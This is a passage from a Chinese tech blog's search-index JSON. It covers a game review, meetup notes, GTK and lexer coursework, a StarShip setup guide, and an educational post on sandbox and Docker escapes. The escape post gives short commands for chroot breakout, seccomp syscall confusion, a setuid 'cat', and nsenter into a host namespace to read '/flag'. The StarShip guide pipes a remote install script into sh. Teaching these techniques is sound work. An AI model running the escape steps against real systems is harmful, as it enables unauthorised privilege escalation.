ASLR。","categories":[{"name":"系统安全","slug":"系统安全","permalink":"https://blog.beacox.space/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://blog.beacox.space/tags/Windows/"},{"name":"ASLR","slug":"ASLR","permalink":"https://blog.beacox.space/tags/ASLR/"},{"name":"shellcode","slug":"shellcode","permalink":"https://blog.beacox.space/tags/shellcode/"},{"name":"PoC","slug":"PoC","permalink":"https://blog.beacox.space/tags/PoC/"}]},{"title":"《山河旅探》(Murders on the Yangtze River) 通关简评","slug":"murders-on-the-yangtze-river","date":"2024-02-16T12:32:00.000Z","updated":"2024-02-16T12:32:00.000Z","comments":true,"path":"posts/murders-on-the-yangtze-river/","link":"","permalink":"https://blog.beacox.space/posts/murders-on-the-yangtze-river/","excerpt":"","text":"收到朋友的安利，趁着过年打折入手了《山河旅探》。其实我此前很少玩推理游戏，可能是因为以前玩剧本杀时我也鲜有准确的推理。一开始吸引我的，是《山河旅探》的水墨风以及据说精彩的剧情。事实证明，《山河旅探》不只有这些优点。 画风 《山河旅探》是一款横轴的推理探案游戏，故事发生在清末民初——正是中国封建主义社会受到到西方政治文化强烈冲击的年代。因此游戏画面即包含田野乡间、官府衙门，也包含汉阳铁厂、轮船、上海街头、会审公廨（中国近代史上外国租界内的司法审判机构，在这些机构内由租界国领事与中国官员共同审理案件）等场景，跨度非常大。比起某些国产动漫（比如《雾山五行》），《山河旅探》的水墨风不算震撼，但是场景的细节都做得不错。 剧情游戏明暗线交织，6个发生在不同地点的案件串联起来的故事，在最后的结局中汇聚、迸发。虽然仅仅10小时左右的游戏时长，但是将许多人物都刻画得立体鲜明——自私的、为祖国事业奋斗的、迷信的、进步的、公正的、伪善的……游戏很好地将故事背景融入到了故事和人物当中，每个人物都是那个年代某一批人的群像。而从案情上来讲，作为一个推理游戏，作案、探案的逻辑经得起推敲，需要细细琢磨。不少案件中的作案手法也是让我觉得脑洞大开。 玩法一开始我已经准备好将这个游戏当作视觉小说去玩了，但是一上手我就知道不带脑子不行了。游戏的玩法比较丰富：作案工具指认、证物指认、证人指认、证言之间的矛盾指认、证言与证物之间的矛盾指认、尸体勘察、现场勘察等，还原了实际探案的大多数流程，十分有代入感。难度上，有个别场景的推理比较难，但大多数时间里我都能做出正确的推理。游戏中也有一些简单的小游戏用于调整节奏。由于之前没有玩过相同类型的推理游戏，因此玩法对于我来说足够新鲜也足够丰富。 配音/配乐游戏中有不少外国人（英国人），英文配音的伦敦腔挺冲，有种在听小学英语听力的感觉，不过倒是符合人物设定。游戏中还有一段是外国人说着蹩脚中文，此时的字幕也是故意使用错别字，挺有趣。美中不足的是有些片段只有字幕没有配音。以及部分配音片段明显前后音色有差距，有些出戏。 游戏的配乐十分出彩，做到了根据剧情的变化无缝切换，能很好地让玩家沉浸到游戏中去。由于一个人在老家的大房子里玩，时常被剧情配合背景音乐吓得心慌。 其他 游戏中会通过收藏夹的方式介绍非常多的史实和知识，对于我这种一年读不了几本闲书的人来说非常有趣。同时这种方式也能让玩家更好地了解背景知识、更能够代入到每一个角色中去。 之前也听说这部作品从《逆转裁判》系列中借鉴了许多，不过我没有玩过《 逆转裁判》系列，因此不能做一个客观的评价。但这部作品在结尾致谢了许多参与制作的人员以及借鉴的游戏、小说等各种作品，借鉴的作品在首页能够点开的开发者寄语中也有： 那么至少游戏制作方是心怀感激、尊重知识产权的，这点就值得国内许多游戏厂商学习了。之后也会再品鉴《逆转裁判》系列，以便更好地评价该作。","categories":[{"name":"游戏","slug":"游戏","permalink":"https://blog.beacox.space/categories/%E6%B8%B8%E6%88%8F/"}],"tags":[{"name":"推理","slug":"推理","permalink":"https://blog.beacox.space/tags/%E6%8E%A8%E7%90%86/"},{"name":"2D","slug":"2D","permalink":"https://blog.beacox.space/tags/2D/"}]},{"title":"沙箱与Docker","slug":"sandboxing-docker","date":"2023-09-16T14:37:53.000Z","updated":"2023-09-16T14:37:53.000Z","comments":true,"path":"posts/sandboxing-docker/","link":"","permalink":"https://blog.beacox.space/posts/sandboxing-docker/","excerpt":"","text":"沙箱技术杂谈为什么沙箱技术被称为沙箱技术？在现实生活中，沙箱是一个装满沙子的小箱子，小孩儿们可以在沙箱里面发挥自己的想象力——建沙堡、画画等，而不会将沙子弄得满地都是。 在计算机安全领域，沙箱技术的主要目标是隔离和保护程序，以防止它们对系统或其他应用程序造成不必要的损害或干扰。 沙箱技术的历史早在上世纪60年代，就已经通过硬件实现了系统和进程代码的隔离。 80年代，通过硬件方法隔离不同进程的内存空间。VAX/VMS操作系统引入了”访问控制列表”的概念，允许管理员对文件和资源进行更细粒度的权限控制。这是隔离和控制访问的重要步骤。 90年代，互联网逐渐开始普及。产生了解释器和被解释的代码之间的隔离，以及Java虚拟机（JVM）等早期沙箱技术。 2000年左右，是针对浏览器的网络攻击最盛之时。 而2010年前后，现代沙箱技术崛起了，主要用于浏览器，让不被信任的代码、数据被放置于一个被隔离的进程中。当被隔离的进程（子进程）想要执行一些需要授权的操作时，需要向父进程（如Firefox）请求，得到允许后方可执行。 沙箱逃逸chroot()chroot()系统调用最早于1979年出现在Unix系统，然后出现在BSD系统。这是一种传统沙盒。 chroot('/sandbox')的作用是让调用该函数的进程以及其子进程认为根目录是/sandbox，在/sandbox中时，不能cd ../到真正的根目录，因此一定程度上限制了进程对/sandbox外资源的访问。 路径穿越考虑在根目录运行如下C代码（不完整）： 12chroot(\"/sandbox\");execl(\"/busybox\", \"sh\", 0); // Busybox在单一的可执行文件中提供了精简的Unix工具集，在这可以理解为运行了一个Linux系统 初看：busybox运行，它认为自己的根目录是/sandbox。但问题是，调用chroot()不会自动更改工作目录，因此busybox的工作目录还在根目录，可能可以借由这个工作目录访问沙箱外的资源。 资源未关闭仅仅执行chroot()，并不会将先前打开的资源（如文件）关闭（留下文件句柄）。 Linux中有许多后缀为at的系统调用，可以根据目录（的句柄）和相对路径找到文件。以下是一些例子： 12int openat(int dirfd, char *pathname, int flags);int execveat(int dirfd, char *pathname, char **argv, char **envp, int flags); 如果先前有打开的目录未释放句柄，那么很容易利用句柄访问任意文件。 重复调用chroot()调用了一次chroot()后，如果没有明确限制，可以再次调用chroot()。考虑以下情况： 位于根目录为/sandbox的沙箱中（已经执行chroot(\"/sandbox\");）。 123456mkdir springboard # 在沙箱的根目录中创建目录chroot springboard # 现在进程认为/sandbox/springboard是它的根目录# 但是现在工作目录是/sandbox，我们实际上处于进程所认为的根目录外面，因此不受限制# chdir ../../# 现在工作目录就是/# 我们已经到达了真正的根目录 seccompseccomp被称作系统调用的防火墙。可以禁用某些系统调用，或者基于参数来禁用。docker、chrome、firefox等，都依赖于seccomp。 seccomp的规则将会被children继承 123456scmp_filter_ctx ctx; //seccomp过滤规则的数据结构ctx = seccomp_init(SCMP_ACT_ALLOW); //初始化seccomp, 允许所有系统调用seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0); //禁止 execve 系统调用seccomp_load(ctx); //应用规则execl(\"/bin/cat\", \"cat\", \"/flag\", (char *)0); //这个函数会调用 execve，将被 kill 更多使用方法： 1man seccomp_rule_add 宽松的过滤规则Linux系统现在有300多种系统调用，且仍然在不断更新，十分复杂。沙箱应用开发者为了功能、性能或方便，可能会制定相对宽松的过滤规则。有些未被允许的系统调用就有可能被用于逃逸。 系统调用混淆许多64位架构向后兼容了32位。在amd64等架构中，你可以在同一个进程中切换32/64位模式。 不过有趣的是，不同架构（甚至是同一个架构的32/64位）的系统调用号不一样。例如： exit()在amd64中号码是60，在x86中是1。 在amd64操作系统中，seccomp默认配置的是amd64下允许/禁用的系统调用。如果允许两种模式下的系统调用，那么沙盒很可能顾此失彼。 考虑下面这种情况： 系统调用号 amd64 x86 3 close read() 4 stat() write() 5 fstat() open() 如果开发者在配置规则时，本意是允许close(), stat(), fstat()系统调用，但由于seccomp是根据系统调用号进行过滤，当我们使用32位的指令进行系统调用时，我们竟然可以调用open, read, write——这意味着我们可以读取文件的内容并输出到其他文件或标准输出等。 内核漏洞如果沙盒的seccomp被正确配置，攻击者很发起有用的攻击。但是，用户仍然可以调用在白名单中的系统调用。如果内核中含有漏洞，通过系统调用，攻击者就可能利用这些内核漏洞。 听起来很玄乎，但其实内核与普通软件一样，都是代码，都或多或少存在漏洞，单是2019年一年，就有超过30个Chrome沙盒逃逸，其中大部分利用了内核漏洞。 namespace——现代解决方案命名空间是 Linux 中可用的功能，用于隔离不同系统资源方面的进程。在Linux中有很多namespace，包括： mnt（挂载点，文件系统） pid（进程） net（网络堆栈） IPC（系统 V IPC） uts（主机名） 用户（UID） 等。使用挂载命名空间、pivot_root可以让用户只能访问原本文件树的一部分。 原有root挂载点未删除一般会将旧的根目录挂载到沙箱内某个挂载点，然后使用pivot_root将根目录换成新的“根目录”，然后再将该挂载点和目录删除。如果忘记删除原有挂载点，则沙箱形同虚设。 共享文件系统如果沙箱和宿主共用文件系统（沙箱对文件系统有写权限），那么沙箱用户就可以利用自己的root权限来在沙箱外提取。例如，在沙箱内： 1chmod 4755 /bin/cat 那么在沙箱外的任何用户就都可以以root身份运行cat，这意味着可以读取任何文件。 先前打开的资源未关闭与chroot()中讨论的一致。 setns()和/procsetns(): 1int setns(int fd, int nstype); fd参数是下列两者其中之一： • 指向/proc/pid/ns/目录中的一个链接（或绑定挂载到此类链接）的文件描述符； • 一个进程文件的句柄 nstype视情况而定。 setns()系统调用可以将当前进程的命名空间切换成其他进程的命名空间。 在bash中，可以： 12PID=149nsenter --mount=/proc/$PID/ns/mnt cat /flag 这样当前bash就会拥有和PID为149的进程一样的挂载命名空间。假如这个进程是沙箱外的，那么当前bash就有了沙箱外的挂载命名空间，意味着沙箱内用户可以访问完整的文件树。 也就是说，将原有的/proc挂载到沙箱中，且沙箱外有其他进程未关闭的情况下，是非常危险的！ DockerDocker容器 vs 沙箱Docker容器和沙箱有许多相似之处，例如： 环境隔离 两者都与宿主系统产生了一定的隔离，起到了限制和保护作用 轻量 相比于虚拟机，两者都称得上轻量 但两者是截然不同的技术： 隔离级别： Docker容器提供了一种相对较高级别的隔离，包括文件系统隔离、进程隔离、网络隔离等。容器之间通常是相互隔离的，但它们仍然在同一个操作系统内核上运行。沙箱通常提供更加细粒度的隔离，通常是为了限制单个应用程序或代码的权限。沙箱环境可以是单进程的，不涉及多个容器或应用程序的协同工作。 用途： Docker容器是用于构建、打包和运行应用程序的独立、可移植的环境。它们旨在在不同的环境中一致地运行应用程序，包括开发、测试和生产环境。Docker容器通常包括应用程序及其依赖项，并提供了隔离、版本控制和自动化部署的能力。沙箱是一种安全机制，用于隔离和限制运行在其中的代码或程序的能力。沙箱旨在提供一种受限制的执行环境，以防止应用程序或代码对系统或其他应用程序造成损害。它通常用于执行不受信任的代码或对应用程序进行测试，以减少潜在的风险。 隔离技术： Docker容器使用容器化技术，如Docker引擎，通过Linux命名空间、控制组等技术提供隔离和资源管理。沙箱可以使用各种技术，包括操作系统级别的虚拟化、chroot、Seccomp、AppArmor等，具体取决于实现。 Docker安全除了在沙箱技术中提到的namespace, seccomp等，Docker还使用capabilities, control groups等来Linux提供的功能来提升安全性。 cgroups： 资源隔离：Docker使用 cgroups 来隔离容器的资源使用，包括CPU、内存、磁盘I/O等。每个容器都可以分配一定的资源配额，以确保它们不会互相干扰或抢占主机上的资源。 资源限制：cgroups 允许设置容器的资源限制，例如限制 CPU 使用率、内存使用量等。这有助于防止容器滥用主机上的资源，提高整个系统的稳定性。 资源监控：通过 cgroups，你可以监视容器的资源使用情况，以便进行性能调整和资源规划。 capabilities： 最小权限原则：Docker 使用 Linux 的 capabilities 功能来确保容器中的进程以最小权限原则运行。capabilities 允许我们将权限分配给进程，而不需要完全的 root 权限。这样可以减小潜在的攻击面。 降低特权：Docker 默认情况下会剥夺容器中的进程一些敏感的权限，如修改主机的网络配置或访问主机的设备。这有助于降低容器中运行的进程对主机的潜在威胁。 值得一提的是，如果主机 /proc 目录被挂载在 docker 容器中，而且容器的capabilities配置了 CAP_SYS_ADMIN （很高的权限，例如可以挂载文件系统），那么我们能够很轻松的从容器中逃逸。","categories":[{"name":"系统安全","slug":"系统安全","permalink":"https://blog.beacox.space/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"沙箱","slug":"沙箱","permalink":"https://blog.beacox.space/tags/%E6%B2%99%E7%AE%B1/"},{"name":"沙箱逃逸","slug":"沙箱逃逸","permalink":"https://blog.beacox.space/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"name":"Docker","slug":"Docker","permalink":"https://blog.beacox.space/tags/Docker/"}]},{"title":"终端自定义——StarShip","slug":"shell-customize","date":"2023-07-29T11:04:50.000Z","updated":"2023-07-29T11:04:50.000Z","comments":true,"path":"posts/shell-customize/","link":"","permalink":"https://blog.beacox.space/posts/shell-customize/","excerpt":"一个好看且好用的终端或许是生产力的保障。之前折腾终端的时候也试了很多方法，比如换成zsh、fish等，还有实适用于bash的OhMySH项目（不是zsh）……其实都挺不错的，但是有一个问题——速度比不加任何插件的bash慢一些。机缘巧合下，发现了StarShip项目，速度显然更快，因此撰写此文分享、记录。Ubuntu + bash用户可以完全参照此文。","text":"一个好看且好用的终端或许是生产力的保障。之前折腾终端的时候也试了很多方法，比如换成zsh、fish等，还有实适用于bash的OhMySH项目（不是zsh）……其实都挺不错的，但是有一个问题——速度比不加任何插件的bash慢一些。机缘巧合下，发现了StarShip项目，速度显然更快，因此撰写此文分享、记录。Ubuntu + bash用户可以完全参照此文。 先贴出我的终端： shell StarShip介绍StarShip是一个Rust写的终端提示符工具，启动速度很快。官方的介绍如下： 轻量、迅速、可无限定制的高颜值终端！ 快： 很快 —— 真的真的非常快！ 🚀 定制化： 可定制各种各样的提示符。 通用： 适用于任何 Shell、任何操作系统。 智能： 一目了然地显示相关信息。 功能丰富： 支持所有你喜欢的工具。 易用： 安装快速 —— 几分钟就可上手。 因此我不用安装其他终端就可以用，而且实测几乎没有感受到拖慢bash启动速度。 安装并启用字体使用StarShip的前置要求是：安装并在终端启用 Nerd Font 字体，如 Fira Code Nerd Font。 这里就以Fira Code Nerd Font、ubuntu22.04为例。 安装字体 下载字体 下载并解压完成后，选择一种或者几种，双击后点击右上角的install/安装，即可安装字体。 启用字体接下来需要在终端启用字体： 点击右上角的菜单（三根横线） 点击Preferences 点击Unnamed 勾选启用Custom font 点击旁边的选项卡，搜索Nerd，选择一个包含Nerd Font的字体 选择完成后，立即生效。 安装StarShip以Linux为例： 1curl -sS https://starship.rs/install.sh | sh 其他操作系统可参照官方文档 启用StarShip以bash为例： 1open ~/.bashrc 在末尾添加： 1eval \"$(starship init bash)\" 在终端执行： 1source ~/.bashrc 其他终端，如cmd、zsh等可以参照官方文档 提升颜值StarShip可以自行定制样式，可以参照官方文档 对于绝大多数用户来说，可以使用社区提供的预设：社区配置分享 我使用的是Tokyo Night预设，但是做了稍许修改： 将Apple图标改成Linux 添加用户名的显示 如果想直接使用Tokyo Night预设，可以在终端执行以下命令： 1starship preset tokyo-night -o ~/.config/starship.toml 如果想在此基础上将Apple图标改成Linux： 前往Nerd Fonts官网，搜索https://www.nerdfonts.com/cheat-sheet，复制icon。 在终端执行： 1open ~/.config/starship.toml 将第三行的Apple图标替换为刚刚复制的Linux图标，保存并退出 如果想在此基础上添加用户名的显示： 在终端执行： 1open ~/.config/starship.toml 在第三行后新建一行： 1$username\\ 在[directory]一行之前添加： 123456[username]show_always = truestyle_user = \"bg:#a3aed2 fg:#090c0c\"style_root = \"bg:#a3aed2 fg:#9A348E\"format = '[$user ]($style)'","categories":[{"name":"软件","slug":"软件","permalink":"https://blog.beacox.space/categories/%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://blog.beacox.space/tags/shell/"},{"name":"美化","slug":"美化","permalink":"https://blog.beacox.space/tags/%E7%BE%8E%E5%8C%96/"}]},{"title":"隐语开源Meetup一周年专场与会记录","slug":"secretflow-1st-meetup","date":"2023-07-22T11:30:47.000Z","updated":"2023-07-22T11:30:47.000Z","comments":true,"path":"posts/secretflow-1st-meetup/","link":"","permalink":"https://blog.beacox.space/posts/secretflow-1st-meetup/","excerpt":"","text":"隐语是由蚂蚁集团牵头成立的开源隐私计算框架，今天是隐语开源一周年的线下交流活动。说来惭愧，我从未给隐语贡献过一行代码。或者更具体点说，我在一周年Meetup举行前几天才从其他公众号了解到这个框架。但是本着了解前沿技术与框架、向国内大佬学习（离得还算近，何不白嫖蛋糕🎂和周边）的想法，我还是报名参加了此次交流会。 什么是隐私计算？隐语究竟是做什么的？要回答这个问题首先要知道什么是隐私计算。隐私计算的核心特征是：可用不可见。也就是说，我要根据一些数据得到一些结果，按照传统方法，我需要知道这些数据具体的内容，但是利用隐私计算技术，我在不知道这些数据的具体内容的情况下，仍然可以得到结果。举个实际的使用场景来说：医疗保险公司想要获取投保者的过往病史、住院记录等信息，于是向医院索要这些信息，但是医院为了保护患者隐私、防止患者隐私被泄露，不愿意将这些数据全部交给医疗保险公司，这时候医疗保险公司手中投保者的数据和医院手中患者的数据就都形成了数据孤岛，这些数据的部分价值无法发挥。既要保障隐私、又要发挥这些数据的价值，就需要用到隐私计算技术，比如，医院将加密后的患者数据交给医疗保险公司，医疗保险公司对密态数据进行一系列计算（无法解密）后得到结果：患者A的健康风险高、患者B的健康风险低……但是并不知道患者A的过往病史、住院记录等信息。 隐语又是什么？隐语是一个开源的隐私计算框架，核心聚焦于如何丰富产业应用场景，以及如何提升隐私计算能力两个方面。 1.面向使用者隐语可以提供适配于不同场景的多种解决方案，在每种解决方案之中，都可以提供安全的全链路数据处理能力，也可以针对不同业务阶段提供如快速POC、大规模、高可用的能力。 2.面向开发者针对应用系统的集成者，隐语可以提供原子化的集成能力。针对机器学习算法开发者，隐语提供接近传统机器学习算法开发的体验。针对安全协议开发者，可以提供插拨式的快速协议接入能力。 个人的理解是，隐语框架和社区的出现是为了建设一个隐私计算学习、开发与使用的良好生态，让隐私计算能够尽快在更多产业落地，让隐私计算技术能够快速发展。当然了，在隐私计算技术还不算成熟的时期开发一个高可用的框架，势必会让该框架占有一席之地，增加蚂蚁集团在隐私计算方面的影响力与话语权。 与会记录会场这次见面会安排在上海科学会堂。说起来倒是我在上海这么多年第一次去上海科学会堂（毕竟科学素养不够）。 上海科学会堂建筑之一 像是民国时期的建筑，后来去搜索了下： 该建筑原为法国总会，始建于1904年。1957年改为科技工作者活动场所。1958年，上海市科学技术协会成立，这里成为其会址。 进会场要签到，当时在我前面的三、五人似乎是一个公司的，在我后面的看着像是研究生。好在是我看上去比实际老个几岁（在球场经常有人问我做什么工作的），倒也不显得怪异。签完到，发了本关于隐语的小册子，还给我在左臂贴了个写有“嘉宾”二字的贴纸，还挺正式的，后来才知道真正的大咖贴纸上写着“VIP”。 上到二楼，告诉我可以拍照留念，就拍了一张。没成想放在云相册，清晰度没我想象中高。旁边填写问卷还可以领取周边，本来走热了不想填，一听有雨伞，待会可能下雨我又没带伞，还是毛了吧🤣。问卷是关于隐语1.0体验版MVP部署包使用体验的，要填从事什么工作，一看，什么产品开发、什么算法、什么运维、什么策划，只能选其他填个学生了。填完问卷给了我一包贴纸和一把太阳伞，看着质量还不错。 拿着周边我就进会场了，后来才发现……错过了点心——A.K.A.我的终极目标。 点心 众所周知啊，大佬一般来得比较晚。所以我是前几个到场的，倒也好，可以挑一挑位置。最终是坐在一个靠后靠边但能看清的位置。 会场内 大咖们这次Meetup来了挺多大咖，比如上海科协学术部副部长、交大教授兼期智研究院首席科学家、浙大求是讲席教授、蚂蚁副总裁兼首席技术安全官、华为可信计算首席科学家…… 蚂蚁的韦总，他进门的时候我就觉得他应该会坐在VIP席，但绝不是教授🤣，主打的就是成功人士气质。 韦总 用科技打造人文关怀这次的见面会讲了很多议题，但许多理念我是一知半解甚至完全不理解的。不过有一个题目非常吸引我： 技术成果：IIFAA × 隐语：分布式认证助力视障人群线上观影 吴女士正在演讲 吴女士提到一个问题： 我国是视障人群最多的国家。以往，视障人群想要观看院线电影需要组织线下观影活动，许多人要千里迢迢前去观影，十分不便。而倘若为他们提供线上观影服务，则又涉及到版权问题：视力无障碍人群参与其中，一定程度上达到观看常规版本院线电影的观影效果。要想解决这个问题，线上观影服务提供方就必须获取用户是否有视力障碍的信息，信息提供方则应为中国盲人协会等组织。但为保护视障群体隐私，不应当将信息直接暴露给线上观影服务提供方。 这时候隐私计算技术就起到了关键的作用，IIFAA利用隐语框架中的零知识证明等实现了分布式认证的功能，能让用户自己保存能证明自己具有视力障碍的凭证。在用户信息不暴露给线上观影服务方的情况下，实现了身份认证，一定程度上解决了版权问题。 这个议题非常打动我，因为在我看来，科技的终极目标，是为了更好的社会、更好的世界。在隐私计算发展的早期，那些走在前沿的人就不忘人文关怀，这是这个时代的荣幸。隐语社区中不仅有走在学术前沿的人、走在商业前沿的人，也有走在人文关怀中的人，这是隐语社区成长的基石。 合影留念1周年其实是有生日蛋糕吃的，不过在会场外的茶歇区。与会期间一直没出过会场，等结束的时候出去一看……蛋糕没影儿哩。 索性回到会场和大佬们拍了一张大合照。 大合照 生活的角落在准备乘地铁回家的路上，在南昌路和思南路的交汇处看到这样一面墙，倒也有趣。 南昌路 结语国内能够开发这样一个框架、建立这样一个社区，对国内隐私计算技术的发展是一件十足好事。事物的发展离不开培育它的土壤，这也是隐语社区抓住的最核心的理念。而国内许多行业其实都忽略了这样一个理念，大学教育更甚。若是未来能有更多这般的组织涌现、土壤的思想能够深入人心，想必中国科技的发展乃至中国的发展都会如你我所愿。","categories":[{"name":"前沿","slug":"前沿","permalink":"https://blog.beacox.space/categories/%E5%89%8D%E6%B2%BF/"}],"tags":[{"name":"隐私计算","slug":"隐私计算","permalink":"https://blog.beacox.space/tags/%E9%9A%90%E7%A7%81%E8%AE%A1%E7%AE%97/"},{"name":"开源","slug":"开源","permalink":"https://blog.beacox.space/tags/%E5%BC%80%E6%BA%90/"}]},{"title":"GTK应用开发小记","slug":"gtk-first","date":"2023-07-13T08:51:57.000Z","updated":"2023-07-13T08:51:57.000Z","comments":true,"path":"posts/gtk-first/","link":"","permalink":"https://blog.beacox.space/posts/gtk-first/","excerpt":"","text":"夏季学期课程的小组作业，是要开发一个基于Linux内核模块的包过滤防火墙。主要有两部分的任务： 配置程序 运行在应用层，用来配置过滤规则，包括协议类型、IP地址、端口号、开始和结束时间、是否启用规则等。 Linux内核模块 运行在内核层，完成包过滤防火墙的功能，该模块借助注册Netfilter钩子函数的方式来实现对数据包的过滤和控制。 我主要负责了第一部分的任务：开发一个友好的包过滤规则的配置和管理界面（GUI部分，CLI部分由组里另一位同学负责）。支持包过滤的规则导入、导出，添加、编辑、 删除、搜索等功能。应用界面如下： 谈不上好看，但也不至于很丑。 GTK vs QTGTK和QT是非常有名的两个GUI库，当然QT应该是更有名些。GTK和QT的优势对比如下： QT： 跨平台性：QT是一个跨平台的工具包，可以在多个操作系统上运行，包括Windows、Linux、macOS等。它提供了一致的API，使得开发者可以轻松地编写一次代码，然后在不同的平台上进行部署和运行。 高度集成：QT提供了丰富的组件和工具，涵盖了广泛的应用开发需求，包括图形渲染、网络通信、数据库访问等。它还提供了开发者友好的IDE和调试工具，使得开发过程更加高效。 QML和Qt Quick：QT引入了QML和Qt Quick技术，允许开发者使用声明性语言和组件化的方式来设计和构建用户界面。这种方式简化了UI设计和开发的过程，并提供了良好的可扩展性。 商业支持：QT由The Qt Company开发和维护，提供了商业许可和支持服务。这对于企业级应用开发来说是一个优势，因为他们可以获得专业的技术支持和保障。 GTK： 开源性：GTK是一个开源工具包，它的代码可以被自由地查看、修改和分发。这对于开源社区和个人开发者来说是一个优势，他们可以根据自己的需求进行自定义和改进。 UNIX哲学：GTK是基于UNIX哲学设计的，它鼓励模块化和简洁的设计。这种设计理念使得GTK在Linux等UNIX-like系统上有着很好的集成和兼容性。 GNOME集成：GTK是GNOME桌面环境的默认工具包，它与GNOME的集成非常紧密。如果你计划开发适用于GNOME桌面环境的应用程序，使用GTK可能更加方便和自然。 多语言支持：GTK支持多种编程语言，包括C、C++、Python等。这使得开发者可以使用自己喜欢的编程语言来进行应用程序的开发。 最终我是选择了GTK3进行GUI开发，原因如下： 这次开发的防火墙程序是基于Linux内核模块的，所以只能在Linux系统使用，不需要考虑GUI的跨平台。 Glade应用提供了GTK应用的UI设计功能，起到和QML、Qt Quick类似的作用。 开源、不需要商业支持。 防火墙属于网络层的应用，不需要太多功能，简洁至上。 在Ubuntu22.04环境下开发，使用GTK接近原生UI。 GTK的默认样式足够好看。 GTK &amp; glade学习GTK相比QT的一个最大劣势就是文档更少、社区也更不活跃。B站和YouTube搜索QT，有非常多的教程，而GTK相对来说就比较少了。另外GTK4已经问世数年，但是教程大多还是GTK3。之前提到用来设计GTK应用UI的glade，支持的最高GTK版本也是GTK3。 好在对于这样一个简单的GUI应用，只需要入门GTK便可。学习一样工具，我总是喜欢边学边做。因此视频+文档的组合往往是更适合我的。在我学习GTK开发的过程中，主要参考了以下资源： Linux Gtk Glade Programming YouTube上的GTK &amp; glade开发教程，没有涵盖GTK的所有类，但对入门来说够用而且友好。 视频中的源代码 更多时候我其实是直接看源代码学习，视频节奏有些拖沓，一旦理解GTK和glade是怎样工作的，看代码会是更高效的解决方法。 GTK3文档 文档很全面，但只有英文。 ChatGPT 文档没写全的、视频没讲到的可以问问GPT。看看思路可以，3.5写出来的代码可能不能直接用。 GTK &amp; glade开发流程使用GTK &amp; glade开发，主要是应用UI设计和功能实现分离的思想。 在glade应用中设计UI 哪里是按钮，哪里需要输入框，哪里需要列表等等，需要提前构思好。 在glade应用中连接信号（signals） 所谓信号，就是当用户与界面发生某种特定的交互时，应用程序便会知悉，并可根据这种信号回调对应的函数、传入特定的数据进行特定的操作。可以在glade中连接信号并指定对应的回调函数，以及需要传入的数据。这样在后续功能实现时，只需将这些函数的功能实现即可，也很好地实现了模块化。 编写GTK代码 主要是实现之前在glade中指定的回调函数。另外，一些用于提示用户的对话框也可以直接用代码生成。 编译程序 在开发阶段，一般从glade文件加载builder（gtk_builder_new_from_file），并使用gcc的-export-dynamic参数。这样一来，修改glade文件后无需重新编译就可以看到新的UI。 而在生产环境中，不能使用上述方法。因为上述方法编译的应用程序需要依赖glade文件运行，而一般用于生产环境的应用程序需要将glade文件一同编译成最后的二进制程序。因此要从资源中加载builder（gtk_builder_new_from_resource）。因此首先要把glade文件编译成资源，这个过程需要用到glib-compile-resources工具。具体方法可以参照Linux Gtk Glade Programming Part 34: Embedding resources in your app。 难点 TreeView GTK中的TreeView以及ListBox是非常重要的组件，适合用于用户与系统的数据交互，区别在于TreeView可以有多层父子结构，而ListBox只有单层。 Log功能 Log功能的第一版思想是：每隔一段时间（如1s）监测日志文件的变化，当日志文件大小发生改变时，将新增的内容显示在应用的TextView当中。但是如果使用一个线程，会导致应用要轮流处理与用户的交互和日志文件的监测，而日志文件又需要频繁监测，造成较差的用户体验。因此为监测日志文件变化的功能单独创建一个线程进行处理。 但是线程需要应对一系列互斥与共享的问题，因此我换了一种实现方法。 第二版的思想是：使用GFileMonitor来监测文件的变化，当文件变化时，会发出一个信号，GTK应用能捕捉这个信号并做出相应的处理。 GFileMonitor VS 多线程： 优点: GFileMonitor使用更简单,不需要自己编写多线程逻辑。它提供了文件变化事件的回调接口,只需要关心事件处理逻辑。 GFileMonitor对文件系统事件的处理可能更高效。它基于操作系统提供的文件变化监控机制,不需要频繁地轮询检查文件。 GFileMonitor可以方便地跨平台使用,而自行实现的多线程文件监视可能需要针对不同平台调整。 缺点: GFileMonitor的可定制性较低,不能自由控制轮询频率等参数。 GFileMonitor可能不支持监视网络文件系统或一些特殊文件系统。 GFileMonitor基于系统调用,系统开销可能略大于纯用户态的多线程实现。 自行实现的多线程方案可以加入更多自定义逻辑,例如合并事件、缓存等。 源代码（完整程序）VersaGuard-FireWallhttps://github.com/BeaCox/VersaGuard-Firewall","categories":[{"name":"项目","slug":"项目","permalink":"https://blog.beacox.space/categories/%E9%A1%B9%E7%9B%AE/"}],"tags":[{"name":"C","slug":"C","permalink":"https://blog.beacox.space/tags/C/"},{"name":"设计","slug":"设计","permalink":"https://blog.beacox.space/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"TINY Scanner开发文档","slug":"TINY-Scanner","date":"2023-05-29T13:37:58.000Z","updated":"2024-05-13T11:49:58.000Z","comments":true,"path":"posts/TINY-Scanner/","link":"","permalink":"https://blog.beacox.space/posts/TINY-Scanner/","excerpt":"前言NIS2336编译原理课程的大(?)作业。","text":"前言NIS2336编译原理课程的大(?)作业。 代码仓库： NIS2336_lexical_analysishttps://github.com/BeaCox/NIS2336_lexical_analysis 要求如下： 前期准备了解TINY language语言，并能用TINY language写较简单的程序；掌握词法分析的步骤方法，能根据程序段模拟自动机的分析过程生成token序列。 TINY language词法分析功能说明TINY language语言的词法单元： 词法单元 文件global.h中定义了所有的词法单元类型TokenType，并在lexer.h中声明。本次实验要求在读懂lexer.c中已有代码的基础上完善补全lexer.c中的主函数getToken(void)，该函数通过判断当前状态并根据当前读入的词法单元来输出当前读入词法单元的token，并更新状态和词法单元，根据给出代码中的示例补全switch语句中case为其他状态时的情况。 处理结果要求给定一段符合TINY language语法的代码，写成.tny文件，放在build\\test文件夹内。要求程序能够输出这段代码的每一行，在每一行的后面输出这一行所有词法单元的token。 示例输入和输出如下所示： 123456789101112131415read xif 0 &lt; x then fac := 1 repeat fact := fact * x x := x – 1 until x = 0 write facend example1example2 提交要求和方法 本次实验只对lexer.c进行修改，其他文件不进行修改。在提交时只需将修改完善后的lexer.c上传即可。 DFADFA 